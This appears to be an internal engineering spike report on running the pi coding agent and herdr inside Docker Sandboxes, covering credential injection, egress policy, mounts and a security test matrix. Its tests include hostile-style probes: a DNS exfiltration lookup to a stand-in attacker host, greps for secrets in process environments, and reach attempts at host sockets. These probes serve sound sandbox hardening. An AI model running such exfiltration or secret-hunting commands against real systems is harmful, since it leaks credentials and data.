# pi + herdr in Docker Sandboxes (`sbx`) — requirements, pros/cons, hardening spike

as-of: 2026-11-11 · status: **spike run on pluto: T1–T6 pass with home-llm** · hardening continues step by step · NOT a decision

## Spike results (2026-11-11, pluto, sbx v0.51.0, topology A)

Stance: any sandbox beats no sandbox. This is a big step up from today, and the gaps
below are next hardening steps, not blockers.

| Test | Result | Evidence |
|---|---|---|
| T1 secrets out of sight | ✅ | canary stored via `set-custom --value-stdin`; the VM only ever saw the placeholder; the host echo endpoint received the real value; grep of environ/home/etc/tmp in the VM found nothing |
| T2a pi → home-llm | ✅ | `pi -p` and a pi pane inside herdr both answered via `host.docker.internal:40115`, with a single per-sandbox allow rule |
| T3 egress deny | ✅ | example.com http/https, `1.1.1.1:443`, DNS-over-TCP to `8.8.8.8`, DNS exfil lookups: all denied, each visible in `sbx policy log` |
| T4 host reach | ✅ | no host docker socket, no host SSH banner, no LAN (192.168.1.1), no host `~/.pi` / `~/.ssh` |
| T5 FS blast radius | ✅ | `:ro` workspace not writable; files written outside the workspace stay in the VM |
| T6 herdr ops | ✅ | `setsid nohup herdr server` survives exec end (no entrypoint needed); UDS on VM disk OK; pi pane round trip OK; `sbx ports` → host **127.0.0.1 only** |
| T6 auto-stop | ✅ with `-d` | by default a local sandbox **auto-stops 30 s after its last session disconnects** (background processes don't count), which kills herdr. `sbx run -d --name <sbx>` switches it to detached mode permanently (log: "detached; not auto-stopping"); verified 65 s with no session, herdr still up |
| T6 stop/start + resume | ✅ | files, policies, ports persist; processes don't. After `herdr server` restart, with `pane_history = true` (repo `herdr-config.toml`) + herdr's pi integration (`herdr integration install pi`): panes, scrollback **and pi with its conversation** come back. pi remembered a word across a full `sbx stop`/start. Published host port changes unless pinned |
| T9 nested mounts (UC1) | ✅ | `shell <dev>/repoA <dev>:ro <dev>/repoA/.env:ro`: repoA rw (writes reach host), repoB + `<dev>` top level read-only; single-file `:ro` only write-protects (still readable); empty-file shadow `<emptyfile>:<dev>/repoA/.env:ro` hides it (0 bytes inside, host file unchanged) |
| UC2 git round trip | ✅ | mountless sandbox; `sbx secret set github --sandbox uc2 -f < tokenfile` (fine-grained PAT, this repo only); allow only `github.com:443` + `api.github.com:443`; clone → branch → commit → `git push` OK (branch `sbx-uc2-test-20261111`); VM holds only a placeholder `GH_TOKEN`; example.com, gitlab.com, raw.githubusercontent.com, api.openai.com → 403, logged as denied. Note: the agent *can* exfiltrate via the allowed repo itself (push any data), so the token's scope is the real limit |
| T2b keyed providers, T7 lateral, T8 kit | ⏳ | next steps |

**Learned in practice:**
- A bare TCP `connect()` "succeeds" because the transparent proxy accepts it locally,
  but no data passes. Test egress by data, not by connect (fixed in `probe-inside.sh`).
- herdr panes inherit the *server's* env, not `sbx exec -e`. Put provider config in files
  (`~/.pi/olla/settings.json`), not in exec env.
- A `set-custom` placeholder env var reaches only new sessions; existing exec sessions
  don't see it.
- Pluto has no keychain, so sbx stores the login + secrets in `~/.config/com.docker.sandboxes` (0700).
  That's host-side, outside the VM, but readable by any `cgint` process.
- By design: if an allowed secret-host *echoed* request headers back, the real secret
  would enter the VM. Bind secrets only to hosts that don't reflect headers.
- `sbx create -e KEY` (bare) copies the host value into the VM. Never use it for secrets.
- pi extensions must be **installed** (`~/.pi/agent/extensions/<name>/index.ts`), not
  passed with `-e`: herdr's resume restarts pi without the original CLI flags, so a
  `-e`-only provider vanishes ("No models available").
- The Mac-style olla config works unchanged (`baseUrl: http://pluto:40115/v1`): LAN
  hostnames resolve through the sbx proxy once allowed (`sbx policy allow network pluto:40115`).
- **Docker ships an official pi kit** (`docker.io/sbx/pi-kit`, image `sbx/pi-image`,
  nightly `@latest` pi). Its spec (`spike/sbx/reference-official-pi-kit.yaml`) shows how
  pi's `~/.pi/agent/auth.json` OAuth maps to sentinel tokens with host-side refresh: the
  blueprint for T2b. Also a mixin (`docker/sbx-kit-pi-mixin`). Our template could extend
  `sbx/pi-image` instead of `shell-image`.
- Known upstream issues: no documented way to turn detached mode off again
  ([sbx-releases#699](https://github.com/docker/sbx-releases/issues/699)); a kit
  capability for long-running workloads is still a spec proposal
  ([sandbox-kit-spec#35](https://github.com/docker/sandbox-kit-spec/issues/35)).

**Operating recipe (topology A, as verified):**
```
sbx create --name <sbx> -t <template> --pull never shell <ws> [<ws2>:ro]
sbx run -d --name <sbx>                       # never auto-stop
sbx exec <sbx> bash -lc 'setsid nohup herdr server >/tmp/herdr.log 2>&1 </dev/null &'
sbx exec -it <sbx> herdr                       # TUI; detach freely
# after sbx stop/start: re-run the herdr server line; panes + pi sessions resume
```

**Setup used:** `sbx policy init deny-all` → per-sandbox `sbx policy allow network
localhost:<port>`; template `spike/sbx/Dockerfile` loaded via `sbx template load`;
`sbx create --name pi-spike -t docker.io/library/pi-herdr-sbx:spike --pull never shell <rw-ws> <ro-ws>:ro`;
olla extension copied in via `sbx cp` (no runtime deps).

## Summary

- **Feasible.** sbx runs any Linux image as a custom workload; pi + herdr fit as a
  custom template. Local sbx is free, including commercial use; no Docker Desktop needed.
- **Why bother:** it is the first option that can structurally shrink today's blast
  radius. A microVM per sandbox, egress blocked by default, and credentials injected
  host-side mean the key never enters the VM.
- **Credential injection for custom providers is documented** (`sbx secret set-custom`,
  placeholder in the VM, real value swapped into headers host-side). It is **unproven for
  pi** until spike T1/T2 runs. home-llm (`http://pluto:40115/v1`) has *no key*, so step 1
  tests egress only and secret hiding is tested with a canary. Codex/copilot OAuth comes
  later; device-flow OAuth is a known gap (sbx-releases#760, open).
- **Recommended path:** topology **A** (one sandbox = herdr + N pi panes) on this Linux
  host, then the T1–T7 test matrix below.

## Diagram

![topologies](./docker-sandbox-sbx.svg)

(Source `docker-sandbox-sbx.d2`. SVG not yet rendered because `d2` isn't installed on this host; run `d2to.sh docs/docker-sandbox-sbx.d2`.)

## Today's blast radius (baseline to beat)

From `herdr.sh` / `run.sh`:

| Exposure | herdr.sh today |
|---|---|
| LLM credentials | `~/.pi` mounted **rw** → `auth.json` (all provider tokens) readable *and* writable; `GEMINI_API_KEY` in env |
| SSH | `~/.ssh` mounted ro → private keys readable |
| Host FS | `~/dev`, `~/dev-external` ro; repo + `RW_DIRS` rw |
| Egress | unrestricted |
| Isolation | container (shared kernel on Linux; Docker Desktop VM on macOS) |

That combination is the "private data + untrusted input + exfil path" trifecta flagged in
`docs/market-research-agentic-sandboxes.md` §3.2.

## What it takes

| # | Need | Detail | Src |
|---|---|---|---|
| 1 | Host | macOS 14+ **Apple silicon** / Windows 11 + WHP / **Ubuntu ≥24.04** (derivatives unsupported) + KVM + user in `kvm` group. No Docker Desktop. | L1 |
| 2 | Account | `sbx login` (Docker OAuth) is required. Local CLI + compute are free, incl. commercial; cloud sandboxes are pay-as-you-go; org governance is a paid add-on. | L1 (FAQ) |
| 3 | Install | `brew install docker/tap/sbx` · `winget install -h Docker.sbx` · `apt install docker-sbx` | L1 |
| 4 | pi template | pi is not in the built-in agent list, **but Docker ships an official pi kit** (`sbx run --kit docker.io/sbx/pi-kit:latest pi`; image `sbx/pi-image`). Our spike uses its own template for herdr. Base `docker.io/sbx/shell-image` (or `shell-docker-image` for inner dockerd), or any Linux image with bash, curl, git, CA certs, user **`agent` UID 1000, home `/home/agent`**, `USER agent`, entrypoint set. Workload = `<name>.yaml` (kind: workload) + `<name>.dockerfile`; or `sbx template save/load`. Templates are pulled from a registry or loaded from a tar, not from the host image store. | L1 |
| 5 | Image rework | `Dockerfile.herdr` is `node:22-trixie` running as **root** with `/root`/`/Users/cgint` paths → must become uid-1000 `agent`. **This is the open User Switch Plan** (`NOTES.md`). | repo |
| 6 | pi config | Host `~` is not mounted; only workspace(s) and a ro skills store. Bake `settings.json`, `extensions/`, `skills/`, profiles into the template, or `sbx cp` them in, **without** `auth.json`. | L1 |
| 7 | Credentials | Host-side proxy swaps a sentinel/placeholder for the real value *after* the request leaves the VM; **headers only, matched on destination host**, forward-proxy path only. Two routes for custom providers: (a) `sbx secret set-custom --host <gw> --env VAR --value-stdin` (experimental; direct to gateway; the sandbox sees only a placeholder), (b) `model.providers` + `llmman` (⚠ docs warn llmman may forward the key to other endpoints). Secret changes apply to running sandboxes. On Linux the store falls back to a 0700 file `~/.config/com.docker.sandboxes` when there's no keychain. A kit's `oauth.passthrough: true` disables masking entirely. | L1, CLI, peer |
| 8 | Network policy | All outbound TCP denied unless allowed (`sbx policy allow network host:port`, `sbx policy ls`); UDP off, ICMP blocked; DNS via an internal resolver that enforces policy. Host services via `host.docker.internal` (allow as `localhost:<port>`). | L1 / W |
| 9 | Workspace | Default: virtiofs passthrough at the **same absolute path, rw**. Extra workspaces as `PATH[:TARGET][:ro]`; a `:ro` entry may name a single file to hold it out of reach inside a writable workspace. `--clone`: host repo **ro** at `/run/sandbox/source` + a private in-sandbox clone. Mountless: files live only in the VM. | L1, CLI |
| 10 | herdr ops | **No `sbx exec -d`** (detached exec unsupported). The daemon must be the workload's launch command (ENTRYPOINT/CMD); detach with `--detach-keys`. Shell/TUI: `sbx exec -it <sbx> bash` / `herdr`. Web UI: `sbx ports <sbx> --publish 8787`, which binds **host loopback by default** (good for blast radius); the in-VM server must listen on 0.0.0.0. Keep the herdr socket/state on VM-local disk, not the workspace mount. Local stop/start process survival is undocumented: plan to relaunch on every `sbx run`. | CLI, peer |

## Use cases (user, 2026-11-11), same image for both

**UC1 — host-attached: read most of the host, write only chosen dirs.**
- sbx shape: `sbx create … shell <rw-dir>… ~/dev:ro ~/dev-external:ro`. Workspaces
  take `PATH[:TARGET][:ro]`, so this matches run.sh's "ro + rw holes" model.
- Verified (T9): an rw path *nested inside* an ro mount works.
  `shell <dev>/repoA <dev>:ro` → repoA writable (writes reach the host); sibling repoB
  and the `<dev>` top level give "Read-only file system". Same as plain Docker bind mounts.
- Verified (T9): a single-file `:ro` entry (`<dev>/repoA/.env:ro`) only
  **write-protects**; the file stays readable inside.
- Hide a file by shadowing it with an empty host file: `<emptyfile>:<dev>/repoA/.env:ro`
  → 0 bytes inside, secret not visible; the host file is unchanged.
- Caveat: anything mounted ro is still *readable*, so it can reach the allowed LLM
  endpoint. Don't mount secret-bearing paths (`~/.pi`, `~/.ssh`); `.env` files inside
  `~/dev` repos are readable unless shadowed with the empty-file recipe above.
- Runs where sbx runs locally (pluto, the Mac).

**UC2 — self-contained: git clone/pull/push inside, nothing shared with the host.**
- sbx shape: a **mountless** sandbox (no workspace path) and `git clone` inside.
- Git credentials stay outside the VM: `sbx secret set github` makes the proxy put the
  real token on requests to github.com / api.github.com, and the VM sees a placeholder.
  **Verified (UC2 test, pluto):** plain `git clone` + `git push` over HTTPS work with
  **no credential helper and no kit**; the proxy adds the auth. The VM sees only
  `GH_TOKEN=gho_sbxproxymanaged000…` (hash differs from the real token, and no
  `github_pat_` string anywhere in the VM).
- Blast radius = what the token can do. Use a fine-grained PAT scoped to the target
  repos; the agent pushes branches and a human merges (protect `main`).
- Egress: allow only github.com and the LLM endpoint.
- **Portability catch:** local sbx needs KVM.
  - **Hetzner Cloud VPS:** no nested virtualization (several 2026 reports), so no sbx.
  - **Hetzner dedicated:** has KVM.
  - **Google Cloud:** nested virtualization reportedly available (enable per instance; unverified).
  - **w4u** (world4you, Linz; read-only probe 2026-11-11): Ubuntu 24.04.5 LTS, kernel
    6.8.0-149, x86_64. Itself a Hyper-V guest, but nested virt is exposed: AMD EPYC-Milan
    with AMD-V, `/dev/kvm` (root:kvm), `kvm_amd nested=1`. 4 vCPU, ~7 GiB RAM, ~170 GB
    free disk, Docker installed; SSH alias `w4u` logs in as root. Verdict: prerequisites
    met on paper, **not proven** (sbx not installed, no sandbox started). Caveats: microVM
    performance nested in Hyper-V unmeasured; 7 GiB is tight (sbx default sandbox memory
    = 50% of host).
  - **Docker Cloud Sandboxes** (`sbx --cloud`, pay-as-you-go): the same template,
    without our own VPS.
  - Without KVM: the plain Docker image (`Dockerfile.herdr`) on a throwaway VPS, where
    the VPS is the wall. The token then lives inside, so a scoped PAT matters even more.

## Topology fork

- **A — one sandbox runs herdr + N pi panes** (recommended first). Maps 1:1 onto
  `herdr.sh`; herdr's pi lifecycle integration keeps working. Con: agents share one VM,
  with no isolation between them.
- **B — herdr on host, one sandbox per pi pane.** sbx's native model: one microVM per
  agent. Con: pi's `herdr-agent-state` extension can't reach the host herdr socket across
  the VM wall, so lifecycle states (working/idle/done) are lost unless bridged.

## Pros

- A real hypervisor/kernel boundary per sandbox on Linux *and* macOS. The host Docker
  daemon is unreachable; the private inner dockerd lets agents run compose safely.
- Egress denied by default, plus creds kept outside the VM. This structurally breaks the
  trifecta instead of relying on mount discipline.
- `:ro` workspaces (even single-file masks) and `--clone` give back read-only control;
  `sbx rm` wipes everything outside the workspace.
- Linux-native: this host qualifies. virtiofs + VM-local sockets sidestep the old
  macOS bind-mount socket/rename questions.
- Free for local use; built-in TUI dashboard (`sbx`) for oversight.
- **Audit trail out of the box:** `sbx policy log <sbx>` lists every denied *and*
  allowed request (host, proxy path, rule, count). Great for tightening rules step by step.
- Published ports bind host loopback only, so nothing is exposed to the LAN by accident.
- Per-sandbox scoping for both rules and secrets (`--sandbox`): one agent's allowances
  don't leak to another.
- Small workflow delta: pi and herdr ran unchanged; only the provider config moved into
  a file and the image moved to user `agent`.

## Cons / risks

- **Injection works for a custom host (canary, T1)**, but keyed pi providers
  (codex/copilot OAuth) are still untested (T2b). The proxy has a recurring bug class
  around auth headers (sentinel leaked as bearer, stripped headers, HEAD 401s: all
  fixed 2026-04…11, per peer), and `set-custom` is still experimental.
- Processes don't survive `sbx stop`: one command restarts herdr, and panes plus pi
  sessions resume. Without `sbx run -d`, the sandbox auto-stops 30 s after the last
  session. Published host ports change unless pinned.
- We own a custom template; sbx moves fast (0.4x → 0.5x in 2026) → drift risk.
- uid-1000 rework of the image is mandatory (User Switch Plan).
- No detached exec: herdr must be the workload's entrypoint, so the lifecycle is
  tied to `sbx run`.
- The default workspace is **rw**; "ro repo + rw holes" has to be rebuilt from
  `:ro` workspace args (untested how they nest).
- **Docker account login is a hard gate, even for purely local use.** Verified on v0.51.0:
  signed out, `sbx ls`, `sbx template ls` and `sbx policy ls` all fail with "not signed in
  to Docker"; there is no offline mode (only `sbx kit validate --offline`). Docker's FAQ
  reasons: identity ties sandboxes to a person (org governance) and authenticates image
  pulls. Free, no subscription. Not checked: whether the token must be re-validated
  online periodically.
- Per-sandbox image cache costs disk.
- Topology B breaks herdr lifecycle integration; topology A shares a VM across agents.

## Local facts (this host, 2026-11-09)

- Ubuntu 26.04, x86_64, CPU virtualization present, `/dev/kvm` exists (`root:kvm 660`) → supported.
- User `cgint` is **not** in `kvm` group; `sbx` is **not** installed. Both are host changes and need approval.

## Spike test matrix (falsifiable "safe and sound")

| Test | Probe | Pass if |
|---|---|---|
| T1 secrets out of sight | canary via `set-custom --value-stdin` against a host echo endpoint (`spike/sbx/echo-server.py`); inside VM: `sbx exec env`, `/proc/*/environ`, grep home/etc/tmp (`spike/sbx/probe-inside.sh`) | VM sees only the placeholder; endpoint receives the real canary |
| T2a home-llm (no key) | pi → `http://pluto:40115/v1` with a policy allow only | pi completes a prompt; other hosts still blocked |
| T2b keyed providers (later) | `set-custom` direct vs `model.providers`+llmman; include HEAD and non-OpenAI wire requests; codex `secret set openai --oauth`, copilot `secret set github --command 'gh auth token'` | works with placeholder; record failures (device-flow OAuth is known-rejected, sbx-releases#760) |
| T3 egress deny | curl a non-allowed host, raw TCP, DNS exfil (`dig <data>.attacker`), UDP | all blocked; allowlisted LLM/npm/github OK |
| T4 host reach | host docker socket, LAN hosts, `host.docker.internal:<not allowed>`, host `~` | unreachable |
| T5 FS blast radius | write outside workspace; `--clone` write to `/run/sandbox/source`; `sbx rm` | host untouched; ro enforced; VM wiped |
| T6 herdr ops | herdr server as entrypoint; detach; `sbx stop`/`run`; UDS bind/connect/unlink on VM-local disk, then on the workspace mount; TUI via `exec -it`; web UI via `sbx ports` | all work; record what doesn't survive stop |
| T7 lateral | sudo in VM; sandbox→sandbox traffic | no host effect; blocked |
| T8 kit hygiene | our kit never sets `oauth.passthrough: true` | masking stays on |

## Open questions

1. Topology A or B first? (A recommended.)
2. Approve host prep: install `sbx`, `usermod -aG kvm cgint`, `sbx login`?
3. Which pi providers must work in the spike (home-llm only, or codex/copilot OAuth too)?

## Provenance

- **L1** = official docs.docker.com, fetched 2026-11-09: [install](https://docs.docker.com/ai/sandboxes/install/),
  [architecture](https://docs.docker.com/ai/sandboxes/architecture/),
  [security defaults](https://docs.docker.com/ai/sandboxes/security/defaults/),
  [credentials](https://docs.docker.com/ai/sandboxes/configuration/credentials/),
  [models](https://docs.docker.com/ai/sandboxes/configuration/models/),
  [templates](https://docs.docker.com/ai/sandboxes/customize/templates/),
  [base images](https://docs.docker.com/ai/sandboxes/customize/author/base-images/),
  [usage](https://docs.docker.com/ai/sandboxes/usage/), [FAQ](https://docs.docker.com/ai/sandboxes/faq/),
  [CLI ref](https://docs.docker.com/reference/cli/sbx/).
- **W** = community: [pi + ollama in sbx (npm @ai-local/tdd)](https://cdn.jsdelivr.net/npm/@ai-local/tdd@4.7.1/docs/sbx/ollama-integration.md),
  [Docker Model Runner guide](https://docs.docker.com/guides/claude-code-sandbox-model-runner/).
- **Combined from two independent passes:** Claude (this session) and the pi lead in
  herdr `w1:p1` with its scouts. The pi "fundamentals" scout completed and its official-doc
  findings are merged here (licence, `--clone`, `sbx cp`, TUI, install commands). The
  herdr-fit and credential-injection angles were re-run after a restart; their evidence,
  with URLs and issue numbers, is in `agent/research/sbx-scouts-rerun.md` (agent-internal).
  The CVE claims there are peer-reported and not independently checked.
- **CLI** = local `sbx` v0.51.0 `--help` on this host (2026-11-09).
